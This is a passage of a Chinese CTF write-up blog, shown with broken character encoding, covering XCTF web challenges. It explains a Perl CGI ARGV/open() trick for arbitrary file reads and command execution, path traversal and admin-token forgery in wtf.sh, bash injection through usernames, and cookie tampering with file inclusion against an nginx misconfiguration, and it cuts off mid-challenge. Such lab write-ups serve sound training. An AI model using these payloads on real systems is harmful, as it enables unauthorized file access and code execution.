<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">é¦–å…ˆï¼Œã€</span><span class="k">if</span> <span class="p">(</span><span class="o">$</span><span class="n">cgi</span><span class="o">-&gt;</span><span class="n">upload</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">))</span> <span class="p">{</span><span class="err">ã€‘è¿™è¡Œä»£ç ä¸­ï¼Œæˆ‘ä»¬æœŸæœ›</span><span class="n">upload</span><span class="p">()</span><span class="err">è´Ÿè´£æ£€æŸ¥â€œ</span><span class="n">file</span><span class="err">â€å‚æ•°å€¼æ‰€ä»£è¡¨çš„æ–‡ä»¶æ˜¯å¦å·²ä¸Šä¼ ï¼Œç„¶è€Œå®é™…ä¸Š</span><span class="n">upload</span><span class="p">()</span><span class="err">æ£€æŸ¥çš„æ˜¯æŸä¸€â€œ</span><span class="n">file</span><span class="err">â€å‚æ•°å€¼æ‰€ä»£è¡¨çš„æ–‡ä»¶æ˜¯å¦å·²ä¸Šä¼ ï¼ˆç”¨æˆ·å¯æ„é€ å¤šä¸ª</span><span class="n">fileå‚æ•°</span><span class="err">ï¼‰ã€‚æ¢å¥è¯è¯´ï¼Œ</span><span class="n">upload</span><span class="p">()</span><span class="err">å¹¶ä¸è¦æ±‚æ‰€æœ‰çš„</span><span class="n">fileå‚æ•°éƒ½æ˜¯æ–‡ä»¶</span><span class="err">ï¼Œå®ƒåªè¦æ±‚å…¶ä¸­ä¸€ä¸ª</span><span class="n">fileå‚æ•°æ˜¯æ–‡ä»¶å³å¯</span><span class="err">ã€‚è¿™æ„å‘³ç€ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ </span><span class="mi">2</span><span class="err">ä¸ª</span><span class="n">fileå‚æ•°</span><span class="err">ï¼Œä¸€ä¸ªä¸Šä¼ æ–‡ä»¶ï¼Œå¦ä¸€ä¸ªèµ‹ä¸€ä¸ªå˜é‡å€¼ï¼Œè¿™æ ·ä¹Ÿå¯ä»¥é€šè¿‡</span><span class="n">upload</span><span class="p">()</span><span class="err">çš„æ ¡éªŒã€‚</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">ç„¶åï¼Œã€</span><span class="n">my</span> <span class="n">file</span><span class="o">=</span><span class="n">cgi</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">);</span><span class="err">ã€‘è¿™è¡Œä»£ç ä¸­ï¼Œæˆ‘ä»¬æœŸæœ›</span><span class="n">param</span><span class="p">()</span><span class="err">è¿”å›ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œç„¶è€Œå®é™…ä¸Šï¼Œå¦‚æœæˆ‘ä»¬æ„é€ </span><span class="mi">2</span><span class="err">ä¸ª</span><span class="n">fileå‚æ•°</span><span class="err">ï¼Œä¸€ä¸ªä¸Šä¼ æ–‡ä»¶ï¼Œå¦ä¸€ä¸ªèµ‹ä¸€ä¸ªå˜é‡å€¼ã€‚é‚£ä¹ˆ</span><span class="n">param</span><span class="p">()</span><span class="err">è¿”å›æˆ‘ä»¬è¾“å…¥çš„æ‰€æœ‰</span><span class="n">fileå‚æ•°å€¼çš„åˆ—è¡¨</span><span class="err">ã€‚ä½†æ˜¯</span><span class="n">fileä¸èƒ½åŒ…å«ä¸¤ä¸ªå€¼</span><span class="err">ï¼Œæ‰€ä»¥åœ¨ç»™</span><span class="n">fileèµ‹å€¼æ—¶</span><span class="err">ï¼Œç¨‹åºä¼šå–åˆ—è¡¨ä¸­çš„ç¬¬ä¸€ä¸ªå€¼èµ‹ç»™</span><span class="n">file</span><span class="err">ã€‚æ‰€ä»¥å¦‚æœç»™ç¬¬ä¸€ä¸ª</span><span class="n">fileå‚æ•°èµ‹å˜é‡å€¼</span><span class="err">ï¼Œç¬¬äºŒä¸ª</span><span class="n">fileå‚æ•°èµ‹æ–‡ä»¶æè¿°ç¬¦</span><span class="err">ï¼Œåˆ™</span><span class="n">fileä¼šè¢«èµ‹å€¼ä¸ºæˆ‘ä»¬è¾“å…¥çš„å˜é‡å€¼</span><span class="err">ï¼Œè€Œä¸æ˜¯ä¸Šä¼ çš„æ–‡ä»¶æè¿°ç¬¦ã€‚è¿™æ„å‘³ç€ï¼Œæ­¤æ—¶</span><span class="o">$</span><span class="n">fileå˜æˆäº†ä¸€ä¸ªå¸¸è§„å­—ç¬¦ä¸²</span><span class="err">ï¼</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">æ¥ç€ï¼Œã€</span><span class="k">while</span> <span class="p">(</span><span class="o">&lt;$</span><span class="n">file</span><span class="o">&gt;</span><span class="p">)</span> <span class="p">{</span><span class="err">ã€‘è¿™è¡Œä»£ç ä¸­ï¼Œæˆ‘ä»¬æœ¬æ¥æœŸæœ›éå†æ–‡ä»¶çš„æ¯ä¸€è¡Œï¼Œä½†ç”±äºæ­¤æ—¶</span><span class="o">$</span><span class="n">fileæ˜¯ä¸€ä¸ªå¸¸è§„å­—ç¬¦ä¸²</span><span class="err">ï¼Œäº‹å®ä¸Šï¼Œâ€œ</span><span class="o">&lt;&gt;</span><span class="err">â€ä»…å¯¹æ–‡ä»¶èµ·ä½œç”¨ï¼Œå¯¹å­—ç¬¦ä¸²ä¸èµ·ä½œç”¨ã€‚ä½†æ˜¯æœ‰ä¸€ä¸ªç‰¹ä¾‹ï¼Œé™¤éè¿™ä¸ªå­—ç¬¦ä¸²æ˜¯â€œ</span><span class="n">ARGV</span><span class="err">â€ã€‚å½“å­—ç¬¦ä¸²æ˜¯â€œ</span><span class="n">ARGV</span><span class="err">â€æ—¶ï¼Œâ€œ</span><span class="o">&lt;&gt;</span><span class="err">â€ä¼šéå†</span><span class="n">URLä¸­</span><span class="err">ï¼Ÿåé¢çš„æ¯ä¸ªå€¼ï¼ˆæ¯”å¦‚</span><span class="n">POST</span> <span class="o">/</span><span class="n">test</span><span class="o">.</span><span class="n">cgi</span><span class="err">?</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">file1</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">file2</span><span class="err">ï¼‰ï¼Œå¹¶æŠŠå®ƒä»¬å½“åšæ–‡ä»¶è·¯å¾„æ’å…¥åˆ°ä¸€ä¸ª</span><span class="n">open</span><span class="p">()</span><span class="err">è°ƒç”¨ä¸­ã€‚è¿™æ„å‘³ç€ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹ä»»ä½•æˆ‘ä»¬æƒ³çœ‹çš„æ–‡ä»¶å†…å®¹ï¼Œè€Œä¸æ˜¯ä»…ä»…æŸ¥çœ‹æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶å†…å®¹ã€‚</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">æœ€åï¼Œå†è¯´è¯´</span><span class="n">open</span><span class="p">()</span><span class="err">å‡½æ•°ã€‚</span><span class="n">open</span><span class="p">()</span><span class="err">çš„æœ¬æ„æ˜¯æ‰“å¼€ä¸€ä¸ªå­—ç¬¦ä¸²æ‰€ä»£è¡¨çš„æ–‡ä»¶ï¼Œä½†æ˜¯å½“åœ¨å­—ç¬¦ä¸²åé¢åŠ ä¸€ä¸ªâ€œ</span><span class="o">|</span><span class="err">â€çš„è¯ï¼Œ</span><span class="n">open</span><span class="p">()</span><span class="err">å°±ä¼šæ‰§è¡Œè¿™ä¸ªå­—ç¬¦ä¸²ï¼ˆæ¯”å¦‚</span><span class="n">POST</span> <span class="o">/</span><span class="n">test</span><span class="o">.</span><span class="n">cgi</span><span class="err">?</span><span class="n">ipconfig</span><span class="o">|</span><span class="err">ï¼‰ï¼Œå°±åƒè°ƒç”¨ä¸€ä¸ª</span><span class="n">exec</span><span class="p">()</span><span class="err">ä¸€æ ·ã€‚</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ¥ç€ARGV</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ARGVï¼šéå†æ•°ç»„å˜é‡@ARGVä¸­æ‰€æœ‰æ–‡ä»¶åçš„ç‰¹æ®Šæ–‡ä»¶å¥æŸ„
</span></span><span class="line"><span class="cl">@ARGVï¼šæ˜¯ä¸ªå…¨å±€æ•°ç»„ç‰¹æ®Šå˜é‡ï¼Œä¼ ç»™è„šæœ¬çš„å‘½ä»¤è¡Œå‚æ•°åˆ—è¡¨
</span></span><span class="line"><span class="cl">Perl ä¼šå°†perlå‘½ä»¤è¡Œå‚æ•°åˆ—è¡¨æ”¾å…¥åˆ°æ•°ç»„@ARGVä¸­ï¼Œè€Œé»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™äº›å‘½ä»¤è¡Œå‚æ•°æ˜¯Perlçš„æ•°æ®è¾“å…¥æºï¼Œä¹Ÿå°±æ˜¯è¯´Perl ä¼šä»¥ä¾æ¬¡å°†ä»–ä»¬å½“ä½œæ–‡ä»¶è¿›è¡Œè¯»å–ã€‚è¿™é‡Œå¯ä»¥å‚è€ƒCè¯­è¨€çš„argv{}æ•°ç»„ï¼Œä½†ä¸åŒçš„æ˜¯ï¼Œ
</span></span><span class="line"><span class="cl">Perlè¯­è¨€çš„@ARGVä¸­çš„ç¬¬ä¸€ä¸ªå˜é‡å°±æ˜¯å‚æ•°ï¼Œè€Œä¸æ˜¯æ–‡ä»¶åã€‚
</span></span><span class="line"><span class="cl">Param() å‡½æ•°ä¼šè¿”å›ä¸€ä¸ªåˆ—è¡¨ï¼Œä½†åªæœ‰ç¬¬ä¸€ä¸ªæ–‡ä»¶ä¼šè¢«æ”¾åˆ°å˜é‡ä¸­ã€‚
</span></span><span class="line"><span class="cl">å¢åŠ æ–°çš„ä¸Šä¼ é¡¹ï¼Œå¹¶åˆ é™¤filenameï¼Œé‡å¤§æ¼æ´æ¥äº†
</span></span><span class="line"><span class="cl">åˆ é™¤filenameåï¼Œ $fileçš„å€¼ï¼ˆä¹Ÿå°±æ˜¯æ–‡ä»¶åï¼‰å˜ä¸ºäº†ä¸Šä¼ çš„å†…å®¹ï¼Œè€Œè¾“å‡ºçš„æ–‡ä»¶å†…å®¹ä¸ºç©º
</span></span><span class="line"><span class="cl">é€šä¿—ç†è§£å°±æ˜¯ï¼Œæ–°åŠ å…¥çš„æ–‡ä»¶å†…å®¹æ›¿æ¢äº†filenameå‚æ•°ï¼Œä¼ ç»™äº†$fileå˜é‡ï¼Œ&lt;file&gt;å¥æŸ„ä¸­æ‰“å¼€æ–‡ä»¶å†…å®¹ä¸ºç©º
</span></span><span class="line"><span class="cl">é‚£å¦‚æœæˆ‘ä»¬åˆ©ç”¨@ARGVï¼Œå°†$fileæ›¿æ¢ä¸º@ARGVï¼Œå…¶å¥æŸ„å°±æ˜¯ï¼Œå°±æ˜¯å‘½ä»¤è¡Œçš„å‚æ•°å‘€ï¼Œå¦‚æœç»™çš„å‚æ•°æ˜¯æ–‡ä»¶åï¼Œå°±å¯ä»¥è¾“å‡ºç¬¬ä¸€ä¸ªæ–‡ä»¶åçš„æ‰€æœ‰å†…å®¹ã€‚
</span></span><span class="line"><span class="cl">è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨ä»¥ä¸Šä¿¡æ¯æ„é€ ï¼ŒåŠ å…¥æ–°çš„æ–‡ä»¶åˆ—è¡¨ï¼Œåˆ é™¤filenameï¼Œæ–‡ä»¶å†…å®¹å†™å…¥ARGV
</span></span><span class="line"><span class="cl">é‚£ä¹ˆåç«¯æ‰§è¡Œï¼Œå°±ä¼šæŠŠ$fileçš„å€¼æ¢ä¸ºARGVï¼Œä¹Ÿå°±æˆäº†ä¸Šè¿°test.plçš„å†…å®¹ï¼Œä¼šæŠŠä»å‘½ä»¤è¡Œé‡Œè¯»å–åˆ°çš„å‚æ•°ï¼Œå½“ä½œæ–‡ä»¶è·¯å¾„æ‰¾åˆ°å¹¶è¾“å‡ºã€‚
</span></span><span class="line"><span class="cl">é‚£ä¹ˆå¦‚ä½•ä¼ å…¥å‘½ä»¤è¡Œå‚æ•°å‘¢ï¼Ÿå…¶å®ç›´æ¥åœ¨urlç»™å‡ºå‚æ•°å°±ç›¸å½“äºå‘½ä»¤è¡Œä¼ å‚
</span></span><span class="line"><span class="cl">é‚£ä¹ˆï¼Œé€šè¿‡ARGVå’Œurlçš„å‚æ•°å°±å¯ä»¥è¾¾åˆ°è¯»å–æœåŠ¡å™¨ä¸Šä»»æ„æ–‡ä»¶çš„ç›®çš„
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="wtfsh-150">wtf.sh-150
</h2><p>æ³¨å†Œå’Œç™»å…¥ç•Œé¢å°è¯•sqlæ³¨å…¥æ²¡ç»“æœ</p>
<p>ç„¶åæ³¨å†Œåç‚¹å‡»ä»»æ„ç•Œé¢å‘ç°æœ‰å‚æ•°</p>
<p>å†æ¬¡å°è¯•sqlæ³¨å…¥æ²¡ç»“æœï¼Œè¯•è¯•ç›®å½•ç©¿è¶Š../</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201210204271.png"
	width="1518"
	height="751"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201210204271_hu6980279970834769637.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201210204271_hu2179147815055872850.png 1024w"
	loading="lazy"
	
		alt="image-20250201210204271"
	
	
		class="gallery-image" 
		data-flex-grow="202"
		data-flex-basis="485px"
	
></p>
<p>æŸ¥æ‰¾flag</p>
<p>å‘ç°è¿™æ®µæºç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ if is_logged_in &amp;&amp; [[ &#34;${COOKIES[&#39;USERNAME&#39;]}&#34; = &#39;admin&#39; ]] &amp;&amp; [[ ${username} = &#39;admin&#39; ]] $ then $ get_flag1 $ fi $ fi 
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¦æ˜¯cookieä¸­çš„USERNAMEçš„å€¼ä¸ºadminï¼Œè€Œä¸”usernameä¸ºadminå°±èƒ½æ‹¿åˆ°flag1</p>
<p>ä½†æ˜¯æˆ‘ä»¬æ²¡æœ‰adminçš„å¯†ç æˆ–è€…adminçš„token</p>
<p>ç•Œé¢é‡Œé¢æœ‰å¾ˆå¤šusersç›®å½•</p>
<p>æˆ‘ä»¬ç»§ç»­ç›®å½•ç©¿è¶Š</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201210924691.png"
	width="1343"
	height="844"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201210924691_hu13889440891387385700.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201210924691_hu58166542239181813.png 1024w"
	loading="lazy"
	
		alt="image-20250201210924691"
	
	
		class="gallery-image" 
		data-flex-grow="159"
		data-flex-basis="381px"
	
></p>
<p>æ‰¾åˆ°adminçš„ç›¸å…³ä¿¡æ¯</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> Posted by admin ae475a820a6b5ade1d2e8b427b59d53d15f1f715 uYpiNNf/X0/0xNfqmsuoKFEtRlQDwNbS2T6LdHDRWH5p3x4bL4sxN0RMg17KJhAmTMyr8Sem++fldP0scW7g3w== 
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿›bpæŠ“åŒ…çœ‹çœ‹</p>
<p>å‘ç°ç°åœ¨è¿™ä¸²ç¡®å®æ˜¯token</p>
<p>ç„¶åæˆ‘ä»¬ä¼ªé€ æˆadminç™»å…¥</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201213211522.png"
	width="1204"
	height="262"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201213211522_hu16128628161817651013.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201213211522_hu3008569343409741868.png 1024w"
	loading="lazy"
	
		alt="image-20250201213211522"
	
	
		class="gallery-image" 
		data-flex-grow="459"
		data-flex-basis="1102px"
	
></p>
<p>åœ¨ç”¨æˆ·ç®€ä»‹å‘ç°ä¸€åŠflag</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201213247661.png"
	width="1579"
	height="958"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201213247661_hu14423475316871042629.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201213247661_hu13274768891131790801.png 1024w"
	loading="lazy"
	
		alt="image-20250201213247661"
	
	
		class="gallery-image" 
		data-flex-grow="164"
		data-flex-basis="395px"
	
></p>
<p>xctf{cb49256d1ab48803</p>
<p>æ¥ç€ä»ç•Œé¢æºç ç»§ç»­æ‰¾</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">max_page_include_depth=64
</span></span><span class="line"><span class="cl">page_include_depth=0
</span></span><span class="line"><span class="cl">function include_page {
</span></span><span class="line"><span class="cl">    # include_page pathname
</span></span><span class="line"><span class="cl">    local pathname=$1
</span></span><span class="line"><span class="cl">    local cmd=
</span></span><span class="line"><span class="cl">    [[ ${pathname(-4)} = &#39;.wtf&#39; ]];
</span></span><span class="line"><span class="cl">    local can_execute=$;
</span></span><span class="line"><span class="cl">    page_include_depth=$(($page_include_depth+1))
</span></span><span class="line"><span class="cl">    if [[ $page_include_depth -lt $max_page_include_depth ]]
</span></span><span class="line"><span class="cl">    then
</span></span><span class="line"><span class="cl">        local line;
</span></span><span class="line"><span class="cl">        while read -r line; do
</span></span><span class="line"><span class="cl">            # check if we&#39;re in a script line or not ($ at the beginning implies script line)
</span></span><span class="line"><span class="cl">            # also, our extension needs to be .wtf
</span></span><span class="line"><span class="cl">            [[ $ = ${line01} &amp;&amp; ${can_execute} = 0 ]];
</span></span><span class="line"><span class="cl">            is_script=$;
</span></span><span class="line"><span class="cl">            # execute the line.
</span></span><span class="line"><span class="cl">            if [[ $is_script = 0 ]]
</span></span><span class="line"><span class="cl">            then
</span></span><span class="line"><span class="cl">                cmd+=$&#39;n&#39;${line#$};
</span></span><span class="line"><span class="cl">            else
</span></span><span class="line"><span class="cl">                if [[ -n $cmd ]]
</span></span><span class="line"><span class="cl">                then
</span></span><span class="line"><span class="cl">                    eval $cmd  log Error during execution of ${cmd};
</span></span><span class="line"><span class="cl">                    cmd=
</span></span><span class="line"><span class="cl">                fi
</span></span><span class="line"><span class="cl">                echo $line
</span></span><span class="line"><span class="cl">            fi
</span></span><span class="line"><span class="cl">        done  ${pathname}
</span></span><span class="line"><span class="cl">    else
</span></span><span class="line"><span class="cl">        echo pMax include depth exceeded!p
</span></span><span class="line"><span class="cl">    fi
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œè¦æ±‚è·¯å¾„åçš„åç¼€å¿…é¡»æ˜¯.wtf</p>
<p>ç„¶ååˆæ‰¾åˆ°ä¸€ä¸ªreplyåŠŸèƒ½çš„å‡½æ•°</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">function reply {
</span></span><span class="line"><span class="cl">    local post_id=$1;
</span></span><span class="line"><span class="cl">    local username=$2;
</span></span><span class="line"><span class="cl">    local text=$3;
</span></span><span class="line"><span class="cl">    local hashed=$(hash_username &#34;${username}&#34;);
</span></span><span class="line"><span class="cl">    curr_id=$(for d in posts/${post_id}/*; do basename $d; done | sort -n | tail -n 1);
</span></span><span class="line"><span class="cl">    next_reply_id=$(awk &#39;{print $1+1}&#39; &lt;&lt;&lt; &#34;${curr_id}&#34;);
</span></span><span class="line"><span class="cl">    next_file=(posts/${post_id}/${next_reply_id});
</span></span><span class="line"><span class="cl">    echo &#34;${username}&#34; &gt; &#34;${next_file}&#34;;
</span></span><span class="line"><span class="cl">    echo &#34;RE: $(nth_line 2 &lt; &#34;posts/${post_id}/1&#34;)&#34; &gt;&gt; &#34;${next_file}&#34;;
</span></span><span class="line"><span class="cl">    echo &#34;${text}&#34; &gt;&gt; &#34;${next_file}&#34;;
</span></span><span class="line"><span class="cl">    # add post this is in reply to to posts cache
</span></span><span class="line"><span class="cl">    echo &#34;${post_id}/${next_reply_id}&#34; &gt;&gt; &#34;users_lookup/${hashed}/posts&#34;;
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>åŠŸèƒ½æ˜¯æŠŠç”¨æˆ·åå†™è¿›æ–‡ä»¶ä¸­</p>
<p>å¦‚æœç”¨æˆ·åæ˜¯ä¸€æ®µå¯æ‰§è¡Œä»£ç ï¼Œè€Œä¸”å†™å…¥çš„æ–‡ä»¶æ˜¯ wtf æ ¼å¼çš„ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–‡ä»¶å°±èƒ½å¤Ÿæ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„ä»£ç ã€‚ ï¼ˆè€Œä¸”wtf.shåªè¿è¡Œæ–‡ä»¶æ‰©å±•åä¸º.wtfçš„è„šæœ¬å’Œå‰ç¼€ä¸ºâ€™$&lsquo;çš„è¡Œï¼‰</p>
<p>å‰é¢é‚£ä¸ªæ˜¯get_flag1ï¼Œä¸éš¾æƒ³åˆ°åä¸€ä¸ªæ˜¯get_flag2</p>
<p>æˆ‘ä»¬ç”¨${find,/,-iname,get_flag2}ä½œä¸ºç”¨æˆ·åæ¥ç”¨replyåŠŸèƒ½</p>
<p>ä¸Šä¼ çš„wtfæ–‡ä»¶åä»»æ„ï¼Œä½†æ˜¯è¦æ‹¼æ¥æ°´å¹³åˆ¶è¡¨ç¬¦%09ï¼Œä¸ç„¶åå°ä¼šæŠŠæˆ‘ä»¬çš„åé—¨å½“åšç›®å½•å»è§£æ</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201215606000.png"
	width="1865"
	height="659"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201215606000_hu16873573283146899598.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201215606000_hu3537655306649278996.png 1024w"
	loading="lazy"
	
		alt="image-20250201215606000"
	
	
		class="gallery-image" 
		data-flex-grow="283"
		data-flex-basis="679px"
	
></p>
<p>ä¸Šä¼ 1.wtf</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201215850106.png"
	width="1345"
	height="826"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201215850106_hu6541983734369377198.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201215850106_hu11023255895723475776.png 1024w"
	loading="lazy"
	
		alt="image-20250201215850106"
	
	
		class="gallery-image" 
		data-flex-grow="162"
		data-flex-basis="390px"
	
></p>
<p>æ‹¿åˆ°ç›®å½•</p>
<p>æ¥ä¸‹æ¥å†æ³¨å†Œä¸€ä¸ªè´¦æˆ·$/usr/bin/get_flag2</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201220107605.png"
	width="1885"
	height="727"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201220107605_hu4462495600524690112.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201220107605_hu2702483922739394632.png 1024w"
	loading="lazy"
	
		alt="image-20250201220107605"
	
	
		class="gallery-image" 
		data-flex-grow="259"
		data-flex-basis="622px"
	
></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201220132626.png"
	width="1420"
	height="809"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201220132626_hu8321377471205591067.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201220132626_hu17806901830766899800.png 1024w"
	loading="lazy"
	
		alt="image-20250201220132626"
	
	
		class="gallery-image" 
		data-flex-grow="175"
		data-flex-basis="421px"
	
></p>
<p>æ‹¿åˆ°åæ®µflagï¼Œæ‹¼æ¥å³å¯</p>
<p>xctf{cb49256d1ab48803149e5ec49d3c29ca}</p>
<h2 id="web_php_wrong_nginx_config">Web_php_wrong_nginx_config
</h2><p>ç›®å½•æ‰«æ</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250202110157405.png"
	width="1483"
	height="762"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250202110157405_hu3534152769462350601.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250202110157405_hu15712830981790242710.png 1024w"
	loading="lazy"
	
		alt="image-20250202110157405"
	
	
		class="gallery-image" 
		data-flex-grow="194"
		data-flex-basis="467px"
	
></p>
<p>æœ‰robots.txt</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250202110225848.png"
	width="241"
	height="76"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250202110225848_hu2157805303569022078.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250202110225848_hu16472365015846686042.png 1024w"
	loading="lazy"
	
		alt="image-20250202110225848"
	
	
		class="gallery-image" 
		data-flex-grow="317"
		data-flex-basis="761px"
	
></p>
<p>æ‰“å¼€hint.phpæç¤ºæˆ‘ä»¬é…ç½®æ–‡ä»¶ä¹Ÿè®¸æœ‰é—®é¢˜å‘€ï¼š/etc/nginx/sites-enabled/site.conf</p>
<p>ç„¶åhack.phpæç¤ºæˆ‘ä»¬ç™»å…¥ï¼Œæˆ‘ä»¬æŠ“åŒ…çœ‹ä¿¡æ¯</p>
<p>æŠŠisLoginæ”¹ä¸º1</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250202110844545.png"
	width="1310"
	height="851"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250202110844545_hu4830433876523042565.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250202110844545_hu7775750806417071714.png 1024w"
	loading="lazy"
	
		alt="image-20250202110844545"
	
	
		class="gallery-image" 
		data-flex-grow="153"
		data-flex-basis="369px"
	
></p>
<p>åªæœ‰ç®¡ç†ä¸­å¿ƒèƒ½ç‚¹</p>
<p>æŠ“åŒ…ç»§ç»­æ”¹ä¸º1</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250202111027338.png"
	width="1430"
	height="570"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250202111027338_hu15478827690306145758.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250202111027338_hu5950639644278379944.png 1024w"
	loading="lazy"
	
		alt="image-20250202111027338"
	
	
		class="gallery-image" 
		data-flex-grow="250"
		data-flex-basis="602px"
	
></p>
<p>å‡ºç°fileå‚æ•°æƒ³åˆ°æ–‡ä»¶åŒ…å«ï¼Œè¦åŒ…å«ä¹‹å‰çš„nginxæºç </p>
<p>æµ‹è¯•å‡ æ¬¡æ€€ç–‘../è¢«è¿‡æ»¤ï¼Œ</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250202111159482.png"
	width="1709"
	height="686"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250202111159482_hu380629539779224642.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250202111159482_hu7755831932044061568.png 1024w"
	loading="lazy"
	
		alt="image-20250202111159482"
	
	
		class="gallery-image" 
		data-flex-grow="249"
		data-flex-basis="597px"
	
></p>
<p>æç¤ºcontinue</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250202111227804.png"
	width="1570"
	height="505"
